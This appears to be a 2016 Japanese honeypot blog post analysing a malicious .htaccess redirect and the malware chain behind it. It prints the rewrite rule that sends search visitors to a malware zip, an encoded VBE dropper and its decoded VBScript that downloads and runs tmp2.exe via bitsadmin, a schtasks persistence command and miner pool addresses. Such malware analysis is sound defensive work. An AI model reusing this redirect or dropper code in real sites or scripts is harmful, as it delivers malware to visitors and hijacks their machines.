title: .htaccessで悪質なサイトへ誘導する手法
date: 2016-01-21 23:45:06
tags: [honeypot, dionaea]
---

Dionaeaにて.htaccessを使ってマルウェア配布サイトへ誘導する手法を観測しました.  

```
RewriteEngine on 
RewriteCond %{HTTP_REFERER} ^(.*)google\.(.*) 
RewriteRule .* http://testswork.ru/info.zip [L]
```

Google検索経由でアクセスした場合, hxxp://testwork.ru/info.zip へとアクセスさせています.  

#### testwork.ru

###### VirusTotalでのスキャン結果

* [https://www.virustotal.com/ja/domain/testswork.ru/information/](https://www.virustotal.com/ja/domain/testswork.ru/information/)

###### urlQueryでのスキャン結果

* [https://urlquery.net/report.php?id=1453389404756](https://urlquery.net/report.php?id=1453389404756)

#### info.zip

| filename | SHA256 |
|:--------:|:-------|
| info.zip | 29f2a333e29f56de652bb676323873e92406050c4e222fb9c141b228558a76f1 |

###### VirusTotalでのスキャン結果  

* [https://www.virustotal.com/ja/file/29f2a333e29f56de652bb676323873e92406050c4e222fb9c141b228558a76f1/analysis/1453388291/](https://www.virustotal.com/ja/file/29f2a333e29f56de652bb676323873e92406050c4e222fb9c141b228558a76f1/analysis/1453388291/)

info.zipの中にはinformation.vbeのみがありました.  

```
#@~^rAIAAA==Y~q/4?V^~',Z.+mYn6(L+1O`?1.rwDRUtnVsE*@#@&OPUY.nm:Px~;DnlDn}4mD`Jzf}9Ac?OlhE*@#@&@#@&q6PqdODvFjm.raY s!sVglhnBj^Mk2YcnX+EBF*@*!,K4nx,@#@&Pd4Ut+^sR"Ex,E/?1DbwOPEEr[?1.kaY j1Dk2OwEsVgCs+'rJrJ~Z),?1DrwDR};bY@#@&3x9Pk6@#@&@#@&KswxJYPAHK]'O:a  nX+J@#@&`Ds'r4DY2=zJY+kYkAWM3 D!zOha a+r@#@&@#@&3m4W{fG//Gs:Cx9cJ1:[~JmP8rD/CNsrP&DDmx/6+M~h4lO+7+.~r[jMs[rPJLPhwLJ,['PdOmDOPJ8Pr[Pha[J~',lOYMr(PQ4Pr[KswBfvZ!T!*@#@&31tW{9WkZWshCx9`rmhN~&1Pnm4GD.GMPcT*,@*~cZ*cYaDJBF!Z!Zb@#@&@#@Um.raYR5;kD@#@&@#@&oEmDkGx~9K//WshlNc^K::CU9~dna#@#@&P,?+DPqdtA6nmd4Ut+^sRA6+1c^Ws:mx[#l~q?^Db2Yc?swPd+2),kt3X+1RDsrxmYn`*@#@&~,fWk/Ws:l[ktA6nm jDN6ED l[)^V@#@&3N~0!U1YrKxwcsAAA==^#~@]]`]}])]]']]]]}`'")'
```

このように難読化されていました.  
この難読化には下記のツールが使用されたと思われます.  

* [https://gallery.technet.microsoft.com/Encode-and-Decode-a-VB-a480d74c](https://gallery.technet.microsoft.com/Encode-and-Decode-a-VB-a480d74c)

デコードも可能であるため, 試したところ以下のようなVBスクリプトとなりました.  

```
Set WshShell = CreateObject("WScript.Shell")
Set Stream = CreateObject("ADODB.Stream")

If Instr(1,WScript.FullName,"WScript.exe",1)>0 Then 
  WshShell.Run "CScript """&WScript.ScriptFullName&"""",0: WScript.Quit
End if

Tmp="%TEMP%\tmp2.exe"
Url="http://testswork.ru/tmp2.exe"

Echo=DosCommand("cmd /c bitsadmin /transfer whatever "&Url&" "&Tmp&" && start /b "&Tmp&" & attrib +h "&Tmp,360000)
Echo=DosCommand("cmd /c echo error 404 > 404.txt",10000)

WScript.Quit

Function DosCommand(command,sleep)
  Set WshExec=WshShell.Exec(command): WScript.Sleep sleep: WshExec.Terminate()
  DosCommand=WshExec.StdOut.ReadAll
End function
```

%TEMP%にtmp2.exeをダウンロードして実行する, いわゆるドロッパーですね.  
attrib +h でファイルを隠したりもしてます.  


###### malwr.comでのスキャン結果

* [https://malwr.com/analysis/NTQ1ZGQ5OGY2Mjk3NGMwZThjNjExMThlZmRlZTFlZTY/](https://malwr.com/analysis/NTQ1ZGQ5OGY2Mjk3NGMwZThjNjExMThlZmRlZTFlZTY/)

###### hybrid-analysisでのスキャン結果

* [https://www.hybrid-analysis.com/sample/26337534fb67553e07eb6568cd272153120d6b2b565148392e8a13287f367a5e?environmentId=1](https://www.hybrid-analysis.com/sample/26337534fb67553e07eb6568cd272153120d6b2b565148392e8a13287f367a5e?environmentId=1)

#### tmp2.exe

すでにtmp2.exeはダウンロードできなくなっていましたが, オンラインスキャナに上がっていました.  
  
FTPサーバーを立てたりIMG001.exeをダウンロードしてます.  
ダウンロードしたIMG001.exeは HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run などのレジストリや schtasks /create /tn "UAC" /SC ONLOGON /F /RL HIGHEST /TR のようなコマンドでスケジューラに登録して自動起動するようにされます.  
また, powercfg.exeで電源設定などを変更するようです.  


###### hybrid-analysisでのスキャン結果

* [https://www.hybrid-analysis.com/sample/5616b94f1a40b49096e2f8f78d646891b45c649473a5b67b8beddac46ad398e1?environmentId=1](https://www.hybrid-analysis.com/sample/5616b94f1a40b49096e2f8f78d646891b45c649473a5b67b8beddac46ad398e1?environmentId=1)


#### IMG001.exe

Bitcoin Minerだったり, Trojanだったりいくつかあるようです.  
[https://www.hybrid-analysis.com/search?query=IMG001.exe](https://www.hybrid-analysis.com/search?query=IMG001.exe)  


pools.txtというテキストファイルにはBitcoinのプールのアドレスが記述されていました.  

```
stratum+tcp://mine.moneropool.com:8080
stratum+tcp://mine.moneropool.com:3336
stratum+tcp://xmr.hashinvest.net:443
stratum+tcp://xmr.hashinvest.net:5555
stratum+tcp://monero.crypto-pool.fr:3333
stratum+tcp://monerohash.com:5555
stratum+tcp://mine.xmr.unipool.pro:3333
stratum+tcp://xmr.prohash.net:5555
stratum+tcp://xmr.miner.center:2777
stratum+tcp://mine.xmr.unipool.pro:80
stratum+tcp://pool.minexmr.com:7777
stratum+tcp://cryptonotepool.org.uk:7777
stratum+tcp://mro.poolto.be:3000
```

これらのファイルは「Nullsoft Installer」で作成されており, 展開することができます.  

#### 参考

* [ハニーポットにFTP経由で設置されたファイル調査メモ (2016/01/20) - (n)inja csirt](http://csirt.ninja/?p=280)





